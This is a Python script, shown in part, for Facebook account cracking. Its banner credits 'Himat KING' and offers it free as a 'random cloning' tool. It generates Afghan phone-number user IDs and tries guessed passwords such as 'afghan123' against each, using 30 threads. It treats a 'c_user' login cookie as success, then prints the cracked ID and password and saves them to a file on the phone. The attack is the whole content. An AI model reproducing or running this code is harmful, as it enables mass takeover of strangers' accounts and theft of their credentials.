# NAME : H-KING
# FB GROUP : HAZRAT KING-COMMAND WORLD 2023
# FB ID : Hazrat
...
\033[1;32m   [+]===============================================[+]
\033[1;94m   [+]        CREATED BY   :  Himat KING               \033[1;94m
\033[1;33m   [+]        ON GITHUB    :  Himat-FIRE               \033[1;94m
\033[1;31m   [+]        STATUS       :  FREE      \033[1;31m
\033[1;94m   [+]        TOOL VERSION :  1.0                    \033[1;94m[+]
\033[1;32m   [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m
\033[1;33m   [+]        COUNTRY      :  AFGHANISTAN             \033[1;94m
\033[1;31m   [+]===============================================[+]
""")
# MAIN MANU 
def Main():
        ...
        print(logo)
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM CRACK AFG")
...
def sexy():
    ...
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[❤️\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m070\033[1;32m]\033[1;35m [\033[1;32m078\033[1;35m] \033[1;33m[\033[1;34m9378\033[1;33m] \033[1;34m[\033[1;33m9379\033[1;34m]')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'afghan123','700800','۱۲۳۴۵۶','10002000']
            asha.submit(alhaj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK Himat-OK.txt')
    print(' [😁] CP Himat-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[Himat-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mHimat-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mHimat-LOL-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/Himat-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
